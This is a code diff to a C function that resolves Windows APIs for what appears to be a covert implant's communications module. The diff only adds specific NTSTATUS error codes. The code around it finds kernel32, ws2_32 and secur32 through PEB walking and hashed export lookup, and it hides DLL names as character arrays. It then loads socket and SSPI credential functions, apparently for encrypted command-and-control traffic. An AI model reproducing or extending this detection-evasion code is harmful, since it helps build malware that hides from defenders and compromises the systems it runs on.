@@ -98,18 +98,17 @@ static NTSTATUS comms_resolve_apis(COMMS_API *api) {
        Resolve LoadLibraryA from kernel32 (already loaded). */
     typedef PVOID (__attribute__((ms_abi)) *fn_LoadLibraryA)(const char *);
     PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
-    fn_LoadLibraryA pLoadLib = NULL;
-    if (k32) {
-        pLoadLib = (fn_LoadLibraryA)find_export_by_hash(k32, 0x0666395B);  /* LoadLibraryA */
-    }
+    if (!k32) return (NTSTATUS)0xC0000160; /* 160 = no kernel32 */
+    fn_LoadLibraryA pLoadLib = (fn_LoadLibraryA)find_export_by_hash(k32, 0x0666395B);
+    if (!pLoadLib) return (NTSTATUS)0xC0000161; /* 161 = no LoadLibraryA */
 
     /* Resolve ws2_32.dll — try PEB first, fall back to LoadLibraryA */
     PVOID ws2 = find_module_by_hash(HASH_WS2_32_DLL);
-    if (!ws2 && pLoadLib) {
+    if (!ws2) {
         char ws2_name[] = {'w','s','2','_','3','2','.','d','l','l',0};
         ws2 = pLoadLib(ws2_name);
     }
-    if (!ws2) return STATUS_PROCEDURE_NOT_FOUND;
+    if (!ws2) return (NTSTATUS)0xC0000162; /* 162 = no ws2_32 */
 
     api->pWSAStartup    = (fn_WSAStartup)find_export_by_hash(ws2, HASH_WSASTARTUP);
     api->pSocket        = (fn_socket)find_export_by_hash(ws2, HASH_SOCKET);
@@ -123,7 +122,7 @@ static NTSTATUS comms_resolve_apis(COMMS_API *api) {
     if (!api->pWSAStartup || !api->pSocket || !api->pConnect ||
         !api->pSend || !api->pRecv || !api->pClosesocket ||
         !api->pGetaddrinfo || !api->pFreeaddrinfo)
-        return STATUS_PROCEDURE_NOT_FOUND;
+        return (NTSTATUS)0xC0000163; /* 163 = ws2_32 export missing */
 
     /* Resolve secur32.dll (may forward to sspicli.dll) */
     PVOID sec = find_module_by_hash(HASH_SECUR32_DLL);
@@ -133,7 +132,7 @@ static NTSTATUS comms_resolve_apis(COMMS_API *api) {
         char sec_name[] = {'s','e','c','u','r','3','2','.','d','l','l',0};
         sec = pLoadLib(sec_name);
     }
-    if (!sec) return STATUS_PROCEDURE_NOT_FOUND;
+    if (!sec) return (NTSTATUS)0xC0000164; /* 164 = no secur32 */
 
     api->pAcquireCredentialsHandleA  = (fn_AcquireCredentialsHandleA)find_export_by_hash(sec, HASH_ACQUIRECREDHANDLE);
     api->pInitializeSecurityContextA = (fn_InitializeSecurityContextA)find_export_by_hash(sec, HASH_INITSECCTX);
